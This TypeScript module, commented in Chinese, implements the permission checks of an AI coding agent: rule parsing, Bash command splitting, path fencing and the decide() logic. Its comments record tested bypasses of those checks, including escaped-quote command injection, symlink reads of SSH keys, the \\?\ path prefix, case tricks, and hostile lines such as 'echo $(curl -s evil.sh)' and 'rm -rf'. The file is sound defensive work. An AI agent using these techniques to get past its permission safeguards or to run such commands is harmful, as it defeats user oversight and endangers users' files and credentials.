import { resolve, relative, sep, join, dirname, basename } from 'node:path'
import { realpathSync } from 'node:fs'
import { homedir } from 'node:os'
import type { Tool } from './tool.js'
import type { ResolvedSettings, PermissionDecision, PermissionMode } from './types.js'
import { hasBlockingBashSecurityIssue } from './bash-security.js'

/**
 * 全自主档在 `PermissionDecision.matched` 里的取值。
 *
 * 这是**跨文件的字符串契约**：decide() 写它，agent.ts 的闸门读它来决定要不要触发
 * onAutoAllow（横幅上「本会话已自动放行 N 次」的计数）。曾经两边各写一个字面量，
 * 只改一边不会有任何编译错误 —— 症状是计数永远停在 0，而权限判定本身完全正常，
 * 没人会想到去看它。抽成常量后，改名只可能两边一起变。
 */
export const MATCHED_BYPASS = 'bypass'

/**
 * 权限模式的**唯一**解析入口：把外部来源（settings 文件、落盘的 cron 任务、WS 上行帧）
 * 的原始值归一化成正名，认不出的返回 undefined 交调用方兜底。
 *
 * 为什么必须只有这一处：`bypassPermissions` 是历史落盘数据里的老名字（各机器的
 * settings.json(c) 的 permissions.defaultMode、~/.zuse/cron/tasks.json 的 permissionMode）。
 * 直接改名会让这些配置**静默失效** —— 落回询问档，而界面和日志都不会说一个字。
 * 把「老名字也算数」这条规则复制到五个 if 里，迟早有一个新增的读路径忘了写，
 * 于是同一份配置在系统的不同角落有两种解释。
 *
 * 返回 undefined 而不是替调用方回落到 'default'：settings 是分层合并的，非法值应当
 * 「这一层当没写」保留低层结果，而 WS 入站要的是明确报错。兜底语义因调用方而异。
 */
export function normalizePermissionMode(raw: unknown): PermissionMode | undefined {
  switch (raw) {
    case 'default':
    case 'acceptEdits':
    case 'bypass':
      return raw
    // 只读别名：老配置/老任务里写的是它，读进来一律当 'bypass'。写路径绝不产出这个名字。
    case 'bypassPermissions':
      return 'bypass'
    default:
      return undefined
  }
}

/** 由工具名 + 限定符拼出规则字符串。 */
export function buildRule(toolName: string, specifier: string | null): string {
  return specifier === null ? toolName : `${toolName}(${specifier})`
}

/**
 * 解析规则；非法返回 null。`Tool` -> {tool, specifier:null}；`Tool(x)` -> {tool, specifier:'x'}。
 *
 * ## 为什么是**结构式**而不是字符白名单
 *
 * 原来是 `^([A-Za-z_][A-Za-z0-9_]*)(...)$` —— 不认连字符。而 MCP 工具名是
 * `mcp__${serverName}__${toolDef.name}`（`mcp-registry.ts`），**两段都是外部输入**：
 * serverName 是用户写的 JSON key，toolDef.name 来自 MCP server，而 MCP 规范对
 * tool name **没有任何 pattern 约束**（`schema.json` 里就是裸 `"type":"string"`）。
 *
 * 实测这台机器：15 个 MCP 工具里 **14 个带连字符** —— 也就是说它们**一条能生效的
 * 权限规则都写不出来**。`deny` 里写了等于没写：
 *
 * ```
 * deny:[mcp__context7__resolve-library-id]  default → ask     bypass → allow
 * 对照（同规则、名字去掉连字符）            default → deny    bypass → deny
 * ```
 *
 * 所以**不能再对字符集下赌注**（今天补 `-`，明天有人把 server 叫 `my db` 或用中文，
 * 又是同一个洞再修一遍）。改成结构式：工具名 = 「不含括号的一段」。
 *
 * 它仍然守住那条底线 —— `Bash(ls`（缺右括号）必须是**非法**，不能被当成
 * 「一个名叫 `Bash(ls` 的工具」，那样错得更隐蔽。实测 `Bash(ls`、`Bash(ls*) extra`、
 * 空串在结构式下都仍然返回 null。
 *
 * **已知的行为变更**（放宽，评审实测本机现有 41 条规则受影响数 = 0）：
 * - `Bash (ls*)`（工具名与括号之间有空格）由非法变**生效**。对 deny 是收紧，对 allow 是放宽。
 * - `-x`、`.zuse/**` 这类明显写错的东西，从「非法」变成「合法但永不命中」。
 *   **所以本函数必须和 `validateRules` 的第二道校验捆绑使用** —— 单独放宽是净负收益。
 */
export function parseRule(rule: string): { tool: string; specifier: string | null } | null {
  const m = /^([^()]+?)\s*(?:\((.*)\))?$/.exec(rule.trim())
  if (!m) return null
  return { tool: m[1]!, specifier: m[2] === undefined ? null : m[2] }
}

/** 一条规则为什么不对。 */
export type RuleProblem =
  /** 连 `Tool` / `Tool(x)` 的形状都不是（缺右括号、空串……）。 */
  | 'unparsable'
  /** 形状对，但没有叫这个名字的工具 —— 大小写写错、拼错，或者来自尚未连上的 MCP server。 */
  | 'unknown-tool'

/**
 * 找出一组规则里有问题的那些。**纯函数，绝不抛。**
 *
 * ## 为什么必须有它:非法规则今天是**静默丢弃**的
 *
 * `matchesRule` 遇到 `parseRule` 返回 null 时 `return false` —— 「非法 = 不匹配」。
 * 于是一条打错的 deny 规则 = **没有这条 deny**，而用户看到的是「我配了啊」。
 * 全仓此前**没有任何地方校验过规则合法性**。
 *
 * ## 三张表一视同仁,不给 deny 开特例
 *
 * 我原来的设计是「deny 非法就抛、allow/ask 只告警」，理由是后两者 fail closed。
 * **那个理由是错的,评审实测推翻**:
 *
 * ```
 * ask:["Read(~/.ssh/**)"]   → ask     matched=Read(~/.ssh/**)
 * ask:["Read (~/.ssh/**)"]  → allow   matched=-      ← 多一个空格，护栏从「弹框」变「静默放行」
 * ```
 *
 * 机制:`ask` 表不命中就掉到 `decide` 末尾的 `tool.readOnly ? 'allow' : 'ask'`。
 * **只读工具（Read/Grep/Glob）的 ask 规则一旦写错就直接变 allow** —— 而「给敏感路径
 * 挂 ask」正是这类规则最典型的写法。allow 侧确实 fail closed（实测），但既然 ask 会
 * fail open，就不该写成 deny-only 的分支 —— 那等于把一个错误认知固化进代码。
 *
 * ## 为什么只告警、不抛
 *
 * `loadSettings()` 的调用点包括 **daemon 启动**、**每建一个会话**、
 * **每个 `GET /api/models` / `PUT /api/model` 请求**、每次 STT/TTS。抛在那里不是
 * 「开不了新会话」，是 **daemon 根本起不来** —— 而用户改配置的唯一图形入口正是这个
 * daemon 托管的 Web UI。把「部分安全降级」换成「整机不可用 + 自救入口一并没了」，
 * 代价不对等。
 *
 * （`CLAUDE.md` 里「注册表遇重复键直接抛」那条先例**不适用**：那说的是源码级不变量，
 * 在模块加载期触发、由开发者修、fail 时仓库还没发出去；权限规则是**用户数据**，
 * fail 时人已经在用了。同型不同类。）
 *
 * @param knownTools 给了就顺带查「有没有这个工具」。**只能告警不能硬失败** ——
 *   MCP 工具是异步连上来的，启动瞬间工具集不全，一条针对暂时断线的 server 的规则会被误报。
 */
export function validateRules(
  rules: readonly string[],
  knownTools?: readonly string[],
): Array<{ rule: string; problem: RuleProblem }> {
  const known = knownTools ? new Set(knownTools) : null
  const out: Array<{ rule: string; problem: RuleProblem }> = []
  for (const rule of rules) {
    const p = parseRule(rule)
    if (!p) { out.push({ rule, problem: 'unparsable' }); continue }
    if (known && !known.has(p.tool)) out.push({ rule, problem: 'unknown-tool' })
  }
  return out
}

/** Bash 限定符匹配：`*` 全匹配；尾 `*` 前缀匹配；否则精确。 */
function matchCommand(spec: string, command: string): boolean {
  if (spec === '*') return true
  if (spec.endsWith('*')) return command.startsWith(spec.slice(0, -1))
  return command === spec
}

/**
 * 把一条 Bash 命令按顶层控制操作符（&& || ; | 换行）拆成多个子命令。
 * 引号内的操作符不拆（`echo "a | b"` 仍是一条）。这是权限校验的安全核心：
 * 不拆分时,前缀 allow 规则 `Bash(git status*)` 会把 `git status && rm -rf ~`
 * 整条放行 —— 因为整条确实以 "git status" 开头。逐子命令校验后,危险的 `rm`
 * 子命令没有 allow 规则覆盖,整条便不再自动放行。
 *
 * 裸 `&`(后台执行)同样是顶层命令分隔符：`a & rm -rf /` 会把 `a` 丢后台再跑 `rm`,
 * 故必须拆,否则危险子命令整条逃过逐子命令校验(deny/allow 都看不见它)。但重定向里
 * 的 `&` 不拆 —— `2>&1` / `>&2`(前一字符是 `>`/`<`)、`&>file`(后一字符是 `>`)。
 * 这是尽力而为的词法拆分。**转义要处理**（见循环里的 `\\` 分支，那是补一个真实越权洞）；
 * 命令替换不处理 —— 由 hasUnanalyzableShell 兜底。
 *
 * 原注释写的是「不处理转义/命令替换 —— **后者**由 hasUnanalyzableShell 兜底」，
 * 读起来像是两样都有兜底，其实 `hasUnanalyzableShell` 只查 `$(` 和反引号、**不查反斜杠**。
 * 转义那一半当时既没实现、也没有兜底。
 */
export function splitBashCommand(command: string): string[] {
  const parts: string[] = []
  let cur = ''
  let quote: "'" | '"' | null = null
  for (let i = 0; i < command.length; i++) {
    const c = command[i]!
    // **反斜杠转义：连同下一个字符整体吞掉，它不可能是分隔符、也不可能开关引号。**
    //
    // 这里原先没有这个分支，是一个可实际利用的越权洞：bash 里引号外的 `\"` 是**字面量
    // 双引号字符**、不进入引号态，而本函数看到 `"` 就置 `quote`，于是后面的 `;` 被当成
    // 「引号内的分隔符」不拆 —— 整条命令被当成一个子命令，逐子命令的 deny/allow 一起失效。
    //
    // 实跑（git-bash，本仓真正用的 shell）：`ls package.json \"; echo X` 会**执行两条**，
    // 而 decide() 只看到一条 —— `Bash(echo*)` 明明在 deny 表里也照样 ALLOW；
    // 纯默认配置（0 条 deny）下 `cat README.md \"; rm -rf /tmp/x` 同样 ALLOW。
    // 23 项安全检查不会响：它们查的是混淆特征，不是「拆分器与 bash 看法不一致」。
    //
    // **单引号内不转义**（bash 语义：`'\'` 里的反斜杠是字面量），所以这个分支要排除它；
    // 双引号内要吞，否则 `"a\"; b"` 会在 `\"` 处误判引号闭合，后面的 `;` 又被拆开。
    if (c === '\\' && quote !== "'" && i + 1 < command.length) {
      cur += c + command[i + 1]!
      i++
      continue
    }
    if (quote) {
      cur += c
      if (c === quote) quote = null
      continue
    }
    if (c === "'" || c === '"') {
      quote = c
      cur += c
      continue
    }
    if (c === '\n' || c === ';') {
      parts.push(cur)
      cur = ''
      continue
    }
    if (c === '&') {
      // `&&` 逻辑与：拆,跳过第二个 &
      if (command[i + 1] === '&') {
        parts.push(cur)
        cur = ''
        i++
        continue
      }
      // 重定向里的 & 不拆：2>&1 / >&2（前一字符是 > 或 <）、&>file（后一字符是 >）
      if (command[i - 1] === '>' || command[i - 1] === '<' || command[i + 1] === '>') {
        cur += c
        continue
      }
      // 裸 &（后台执行）：也是顶层分隔符,按它拆
      parts.push(cur)
      cur = ''
      continue
    }
    if (c === '|' && command[i + 1] === '|') {
      parts.push(cur)
      cur = ''
      i++
      continue
    }
    if (c === '|') {
      parts.push(cur)
      cur = ''
      continue
    }
    cur += c
  }
  parts.push(cur)
  return parts.map((s) => s.trim()).filter((s) => s.length > 0)
}

/**
 * 命令是否含无法静态拆分的构造：命令替换 `$(...)` 或反引号。这类命令可能把任意
 * 命令藏在替换里（`echo $(rm -rf x)`）,逐子命令拆分看不见。命中时禁用"逐子命令
 * 自动放行",强制走 ask（除非有人显式按整条精确放行）。${VAR} 只是变量展开,不算。
 */
function hasUnanalyzableShell(command: string): boolean {
  return /\$\(/.test(command) || command.includes('`')
}

/** 一组规则里是否有「整条精确放行」该命令的规则（allow_session 追加的整条规则,或用户手写的整条精确 allow）。 */
function hasWholeExactBashAllow(rules: string[], command: string): boolean {
  return rules.some((r) => {
    const p = parseRule(r)
    return p !== null && p.tool === 'Bash' && p.specifier !== null && p.specifier === command
  })
}

/**
 * Bash 命令是否被一组规则"完整覆盖"：要么有规则精确命中整条命令（会话覆盖层
 * allow_session 追加的就是整条精确规则,以及用户写的整条精确 allow）,要么每个
 * 子命令都被某条规则前缀/精确命中。含命令替换时不走逐子命令路径（见
 * hasUnanalyzableShell）。
 */
function bashCoveredBy(rules: string[], command: string, subs: string[], cwd: string): boolean {
  if (hasWholeExactBashAllow(rules, command)) return true
  if (hasUnanalyzableShell(command)) return false
  return subs.length > 0 && subs.every((s) => rules.some((r) => matchesRule(r, 'Bash', s, cwd)))
}

/** 把 glob 转成锚定正则。支持 `**`（含 /）、`*`（不含 /）、`?`；其余字符转义。 */
function globToRegExp(glob: string, flags = ''): RegExp {
  // 去掉前导 ./
  const g0 = glob.replace(/^\.\//, '')
  // 末尾的 `/**` 连同它前面那个 `/` 一起变成可选：`src/**` 既匹配 `src/a.ts`,也匹配
  // 目录本身 `src`。Grep / Glob 的限定符就是**搜索根**（`Grep(path)` / `Glob(cwd)`），
  // 不这么处理的话 `deny: Grep(~/.ssh/**)` 拦不住「根正好是 ~/.ssh」的那次搜索 ——
  // 恰恰是最直白的那种攻击写法。裸 `**` 不走这条（不以 `/**` 结尾）。
  const dirToo = g0.endsWith('/**')
  const g = dirToo ? g0.slice(0, -3) : g0
  let re = ''
  for (let i = 0; i < g.length; i++) {
    const c = g[i]!
    if (c === '*') {
      if (g[i + 1] === '*') {
        re += '.*'
        i++
        // 吃掉 **/ 里的斜杠，使其可匹配零级目录
        if (g[i + 1] === '/') i++
      } else {
        re += '[^/]*'
      }
    } else if (c === '?') {
      re += '[^/]'
    } else if ('.+^${}()|[]\\/'.includes(c)) {
      re += '\\' + c
    } else {
      re += c
    }
  }
  if (dirToo) re += '(?:\\/.*)?'
  return new RegExp('^' + re + '$', flags)
}

/** 把系统分隔符统一成 posix `/`（win32 上 `\` → `/`；posix 上无操作，反斜杠是合法文件名字符）。 */
function toPosix(p: string): string {
  return p.split(sep).join('/')
}

/**
 * 「绝对路径形态」判定。刻意**不用** node:path 的 `isAbsolute`：它按当前平台判，
 * posix 上不认 `C:/x`、win32 上不认得同一份配置在 Linux 下的写法 —— 同一份
 * settings.jsonc 会在两个平台上语义分叉。这里对 `/x`、`//host/share`、`C:/x`
 * 一律认作绝对，规则语言与运行平台无关。
 */
const ABSOLUTE_PATH = /^(?:[A-Za-z]:)?\//

/**
 * 文件路径匹配。**按规则（spec）的形态决定比对基准**，而不是一律拿相对路径比：
 *
 * - `~` / `~/…`：展开成家目录后按**绝对路径**比。只展开规则侧,**不展开目标侧** ——
 *   工具真正打开文件走 `resolvePath()`(tool.ts),它同样不展开 `~`,目标 `~/.ssh/x`
 *   实际打开的是 `<cwd>/~/.ssh/x`。权限侧单方面展开会让"判定的路径"和"打开的路径"
 *   对不上,那是新的绕过口子而不是加固。
 * - 绝对规则（`/etc/**`、`C:/foo/**`）：按绝对路径比。此前一律拿 `relative()` 的结果比,
 *   同盘时恒不命中、跨盘时因 `relative()` 返回整条绝对路径才**碰巧**命中 ——
 *   同一条规则的行为取决于盘符。
 * - 其余（cwd 锚定的相对规则，含 `./` 前缀）：拿 `relative(cwd, abs)` 比，
 *   但**目标必须在 cwd 内**。
 *
 * 最后那道围栏是本函数的安全核心，删掉就是一个可以静默读走 SSH 私钥的洞：
 * `./**` 被 globToRegExp 剥掉 `./` 变成 `**`、编译成 `^.*$`，而 `relative()` 对 cwd 外的
 * 目标返回 `../…`（同盘）或整条绝对路径（跨盘），两者统统被 `^.*$` 命中。于是一条
 * 读起来「仅限当前项目」的规则实际放行**整个文件系统**。围栏之外的目标只有绝对/`~`
 * 规则能命中 —— 那是用户明确写出来的路径，不会看走眼。
 *
 * 注：判逃逸必须是 `rel === '..'` 或以 `../` 开头，不能用 `startsWith('..')` ——
 * 后者会把 `..foo/` 这种合法目录名误判成逃逸。
 */
/**
 * 剥掉 Windows 的扩展长度前缀（`\\?\C:\x` → `C:\x`，`\\?\UNC\srv\share` → `\\srv\share`）。
 *
 * 这不是「顺手规整一下」—— 不剥它，路径 deny 规则可以被一个前缀整体绕过（见 matchPath 里的
 * 引用处）。**只处理 `\\?\`，不碰普通 UNC（`\\srv\share`）** —— 后者是合法的正常路径写法，
 * 规则里也能照常写出来，没有「同一个文件两种拼法」的歧义。
 *
 * 无条件生效、不按平台门控：这类路径在 posix 上不合法，剥了也没有真实路径会受影响；
 * 而按 `sep` 门控意味着在 posix 上跑的测试覆盖不到它 —— 本仓的 CI 只在 Windows 上跑，
 * 但依赖「跑在哪个平台」来决定安全判据是否生效，本身就是个坑。
 */
/**
 * 尽力而为地解开符号链接 / junction：对**已存在的最长父路径**做 realpath，
 * 把尚不存在的尾段原样接回去。
 *
 * **为什么必须做。** 本函数原先是纯词法的，于是 cwd 里一个指向外部的链接，在它眼里就是
 * 一条普普通通的 cwd 内路径。实跑（真 `decide()` + 真读文件）：
 *
 * ```
 * deny: Read(<root>/project/secretdir/**)   allow: Read(./**), Write(./**)
 *   直接读   <root>/project/secretdir/id_rsa  → DENY
 *   经 junction 读 <root>/project/link/id_rsa → ALLOW，且**真读到**私钥内容
 *   经 junction 写 同上                        → ALLOW（命中 Write(./**)）
 * ```
 *
 * **不需要模型先建链接** —— clone 一个不可信仓库即可（git 能携带符号链接）；
 * 此后 `Write(./**)` 这种「仅限本项目」的规则可以写到 `~/.ssh/authorized_keys`。
 * 而下面 matchPath 的文档把那道 cwd 围栏称作「本函数的安全核心」—— 它此前对任何
 * 含链接的仓库都是无效的。
 *
 * **为什么要往上找父目录**：`Write` 的目标通常**还不存在**（就是要新建它）。只对存在的
 * 路径 realpath、不存在就放弃，等于留下「写一个新文件」这个万能绕过口。
 *
 * **代价**：每次判定多一次（最多几次）syscall。`decide()` 因此不再是纯函数 —— 它现在是
 * (入参, 文件系统状态) 的函数。TUI 的规则预览等「只想问问结果」的调用方仍可用，
 * 只是结果会随磁盘变化，这正是安全判据应有的性质。
 *
 * 解不开就返回原值（路径根本不存在、权限不足、竞态被删）——**宁可回到纯词法判定，
 * 也不能因为 realpath 失败就放行**：调用方拿到的仍是一个能参与 deny 比对的路径。
 */
function realpathBestEffort(p: string): string {
  let cur = p
  const tail: string[] = []
  // 上溯到根就停：`dirname('/')==='/'`、`dirname('C:\\')==='C:\\'`，用不动点判据而不是数层数。
  for (;;) {
    try {
      const real = realpathSync.native(cur)
      return tail.length === 0 ? real : join(real, ...tail.reverse())
    } catch {
      const parent = dirname(cur)
      if (parent === cur) return p
      tail.push(basename(cur))
      cur = parent
    }
  }
}

function stripWinLongPrefix(p: string): string {
  if (!p.startsWith('\\\\?\\') && !p.startsWith('//?/')) return p
  const rest = p.slice(4)
  // UNC 变体：`\\?\UNC\srv\share` 的实体是 `\\srv\share`
  if (/^UNC[\\/]/i.test(rest)) return '\\\\' + rest.slice(4)
  return rest
}

function matchPath(spec: string, rawPath: string, rawCwd: string): boolean {
  // cwd 也 resolve 一遍：调用方目前传的都是绝对路径,但相对 cwd 会让 relative() 静默
  // 回落到 process.cwd(),围栏就锚在了错误的目录上。一行成本换掉一整类难查的错。
  // **cwd 也要解链接。** 只解目标不解 cwd，围栏就会把「cwd 本身位于某个链接之下」的
  // 正常情况误判成逃逸（macOS 的 `/var` → `/private/var`、Windows 上把项目放在
  // 一个 junction 里都会踩到）。两边同时解，`relative()` 才是在同一个坐标系里比。
  const cwd = realpathBestEffort(resolve(rawCwd))
  // 无条件 resolve（而不是 `isAbsolute(raw) ? raw : resolve(...)`）：resolve 会把
  // `.` / `..` 段规整掉。少了这步，走绝对规则那条分支时 `deny: Read(/etc/passwd)`
  // 能被 `/etc/./passwd` 绕过 —— 相对分支的 relative() 自带规整，绝对分支没有。
  //
  // **先剥掉 Windows 的扩展长度前缀 `\\?\`，否则它是一个绕过一切路径规则的万能钥匙。**
  // `resolve('\\\\?\\C:\\x')` 得到的是 `//?/C:/x`，与规则 `C:/**` **永不相交**；
  // 而 `resolvePath`（tool.ts）把原路径直接交给 fs，Node 认这种写法、能正常打开。
  // 实跑：`deny: Read(<dir>/**)` 下直接读是 DENY，加个前缀就掉到 ASK ——
  // default 档还会问一次，**bypass（全自主）档下 deny 是仅剩的兜底之一，那里就是静默放行**。
  // `\\?\UNC\srv\share` 是同一个东西的 UNC 写法，还原成 `\\srv\share`。
  // 顺序：先剥 `\\?\` 前缀 → 再 resolve 掉 `.`/`..` → 最后解链接。
  // 解链接必须在最后：realpath 只认真实存在的路径，先把写法规整好它才找得到。
  const abs = realpathBestEffort(resolve(cwd, stripWinLongPrefix(rawPath)))

  // Windows 文件系统大小写不敏感（实测 `C:/Users/nhn/.zuse` 与 `c:/users/nhn/.zuse`
  // 是同一个目录），所以路径比对也必须不敏感 —— 否则 `deny: Read(~/.ssh/**)` 只要
  // 模型把路径写成小写就绕过去了,而这条正是本模块推荐的护私钥写法。
  // 只按 `sep` 门控（与下面 `\`→`/` 归一同一套理由）：Linux 确实大小写敏感。
  // 已知缺口：macOS 默认 APFS 也不敏感,但 sep 是 `/` 覆盖不到 —— 那里靠的是
  // 「不敢假设用户的卷是不是 case-sensitive」,宁可漏报也不误放行 allow。
  const flags = sep === '\\' ? 'i' : ''

  // Windows 用户会把规则写成 `C:\foo\**`；现行 glob 编译把 `\` 当字面量转义，
  // 这类写法恒不命中，又是一种静默失效。只在 win32 归一，避免动 posix 上
  // 「反斜杠是合法文件名字符」的语义。
  let s = sep === '\\' ? spec.replace(/\\/g, '/') : spec
  if (s === '~' || s.startsWith('~/')) s = toPosix(homedir()) + s.slice(1)

  if (ABSOLUTE_PATH.test(s)) {
    // win32 上无盘符的 `/secrets/**` 是「盘符相对」路径：node 会把目标 `/secrets/x`
    // 归到 cwd 所在盘（`E:/secrets/x`），规则却还是裸 `/secrets/**` —— 又一条恒不命中的
    // 静默空规则。补上 cwd 的盘符,让规则和工具实际打开的路径落在同一个坐标系里。
    // `//host/share` 这类 UNC 不能补（`//` 开头）。
    if (sep === '\\' && s.startsWith('/') && !s.startsWith('//')) {
      s = (/^[A-Za-z]:/.exec(toPosix(cwd))?.[0] ?? '') + s
    }
    return globToRegExp(s, flags).test(toPosix(abs))
  }

  const rel = toPosix(relative(cwd, abs))
  // 逃出 cwd（`../…` 同盘上跳 / 跨盘时 relative() 直接返回绝对路径）→ cwd 锚定规则一律不命中
  if (rel === '..' || rel.startsWith('../') || ABSOLUTE_PATH.test(rel)) return false
  return globToRegExp(s, flags).test(rel)
}

/**
 * 单条规则是否命中本次调用。
 *
 * @param kind 限定符的性质，取自 `Tool.specifierKind`（缺省 `'path'`）。`'opaque'` 的
 *   限定符（Agent 描述、WebFetch 主机名、LspInstall 语言 id）不是路径，直接按 glob 比字面量：
 *   不 resolve、不相对化、不过 cwd 围栏。走路径那套会让 `Agent(../修接口)` 这种
 *   会话规则匹配不上它自己（见 `Tool.specifierKind` 的说明）。
 */
export function matchesRule(
  rule: string,
  toolName: string,
  specifier: string | null,
  cwd: string,
  kind: 'path' | 'opaque' = 'path',
): boolean {
  const p = parseRule(rule)
  if (!p) return false
  if (p.tool !== toolName) return false
  // 裸规则：匹配该工具任意调用
  if (p.specifier === null) return true
  // 规则要求限定符，但本次没有可比对的内容
  if (specifier === null) return false
  if (toolName === 'Bash') return matchCommand(p.specifier, specifier)
  if (kind === 'opaque') return globToRegExp(p.specifier).test(specifier)
  return matchPath(p.specifier, specifier, cwd)
}

/**
 * 权限判定（spec §6.3）。顺序：禁用 → deny → Bash 安全闸 → bypass → allow → ask → defaultMode 兜底。
 * @param tool        正在被请求调用的工具。
 * @param specifier   命令（Bash）或文件路径（文件工具）；无则 null。
 * @param settings    已合并的三层设置。
 * @param sessionAllow 本会话内存覆盖层（额外 allow 规则）。
 * @param cwd         当前工作目录，用于路径相对化。
 */
export function decide(
  tool: Tool,
  specifier: string | null,
  settings: ResolvedSettings,
  sessionAllow: string[],
  cwd: string,
): { decision: PermissionDecision; rule: string; matched?: string; reason?: string } {
  const name = tool.name
  const rule = buildRule(name, specifier)
  // 该工具的限定符是路径还是不透明文本（Agent 描述 / WebFetch 主机名等），见 Tool.specifierKind
  const kind = tool.specifierKind ?? 'path'

  // Bash 复合命令逐子命令校验：整条只前缀匹配会被 `safe && evil` 绕过。
  // 子命令列表供 deny/allow/ask 逐条比对；非 Bash 工具按整条 specifier 比对。
  const isBash = name === 'Bash' && specifier !== null
  const subs = isBash ? splitBashCommand(specifier!) : []
  const denyHit = (r: string): boolean =>
    isBash
      ? matchesRule(r, name, specifier, cwd) || subs.some((s) => matchesRule(r, name, s, cwd))
      : matchesRule(r, name, specifier, cwd, kind)
  const askHit = denyHit // ask 与 deny 同样"任一子命令命中即算命中"

  // 1. 工具暴露开关：被禁 → deny（既不暴露也兜底拦截）。
  const { enabled, disabled } = settings.tools
  if (enabled && !enabled.includes(name)) return { decision: 'deny', rule, matched: 'tools.enabled' }
  if (disabled && disabled.includes(name)) return { decision: 'deny', rule, matched: 'tools.disabled' }

  const perms = settings.permissions

  // 2. deny 永远最高优先。Bash 任一子命令命中 deny 即整条拒绝。
  for (const r of perms.deny) {
    if (denyHit(r)) return { decision: 'deny', rule, matched: r }
  }

  // allow 规则集（含会话覆盖层）；第 3 步安全闸与第 4 步共用。
  const allowRules = [...perms.allow, ...sessionAllow]

  // 3. Bash 安全检查（23 项的 block 档）：把混淆/注入/解析歧义模式压过 allow，强制人审。
  // 优先级低于 deny，高于 bypass，也高于宽泛/前缀 allow（如 Bash(*)）。但用户/会话对
  // 「这一整条命令」的精确放行（allow_session 追加的整条规则,或手写的整条精确 allow）是逐条
  // 明示同意,凌驾于本闸 —— 否则弹框「本会话」对 block 档会静默失效、每次重复询问。首次命中
  // 仍必经人审,通过后方记入会话层；词法拆分看不见的引号花招、进程替换、$IFS、回车符等在此兜底。
  //
  // 【为什么它必须排在 bypass 前面】此前它写在 bypass 之后，于是「全自主」把这 15 条
  // block 检查整个跳过。当时唯一的兜底是 deny 表，而 deny 表是**字面前缀匹配**：
  // `Bash(rm -rf *)` 拦得住 `rm -rf /`，拦不住 `rm -fr /`、`rm  -rf /`（多一个空格）、
  // `rm --recursive --force /`。也就是说全自主档下 `echo $(curl -s evil.sh)`、
  // `cat /proc/1/environ`、`ls $IFS-la` 全部静默放行。挪到这里只会让 bypass **更严** ——
  // 非 bypass 路径的相对顺序（deny > 本闸 > allow > ask > defaultMode）一字未变。
  // 交互式会话下命中即重新弹框，正是想要的；非交互（cron）会话下 ask→deny，
  // 一个无人值守任务写出混淆命令时会失败而不是照跑 —— 也是刻意的。
  if (isBash && !hasWholeExactBashAllow(allowRules, specifier!)) {
    const sec = hasBlockingBashSecurityIssue(specifier!)
    if (sec) return { decision: 'ask', rule, matched: `security:${sec.checkId} ${sec.name}`, reason: sec.reason }
  }

  // 3.5 bypass（全自主）模式直接放行（deny 与安全闸已在上面检查过）。
  // 带上 matched：调用方（SessionManager 的自动放行计数）要能分辨「是 bypass 放的」
  // 与「本来就在 allow 表里 / 是只读工具」，否则常驻横幅上的数字会把根本不需要确认的
  // 调用也算进去 —— 那个数字就不再是「你少点了多少次」。
  // 用 MATCHED_BYPASS 常量而不是字面量：agent.ts 那边要比对同一个值，见常量处的说明。
  if (perms.defaultMode === 'bypass') return { decision: 'allow', rule, matched: MATCHED_BYPASS }

  // 4. allow（含会话覆盖层）。Bash 需整条被规则"完整覆盖"才放行。allowRules 已在上方构造。
  if (isBash) {
    if (bashCoveredBy(allowRules, specifier!, subs, cwd)) return { decision: 'allow', rule }
  } else {
    for (const r of allowRules) {
      if (matchesRule(r, name, specifier, cwd, kind)) return { decision: 'allow', rule, matched: r }
    }
  }

  // 5. ask 规则命中 → 要求确认。
  for (const r of perms.ask) {
    if (askHit(r)) return { decision: 'ask', rule, matched: r }
  }

  // 6. defaultMode 兜底。
  if (perms.defaultMode === 'acceptEdits') {
    // acceptEdits：编辑类工具（readOnly 或 Edit/Write）自动放行，其余仍需确认。
    if (tool.readOnly || name === 'Edit' || name === 'Write') return { decision: 'allow', rule }
    return { decision: 'ask', rule }
  }

  // 'default'：只读工具自动放行，其余需确认。
  return { decision: tool.readOnly ? 'allow' : 'ask', rule }
}
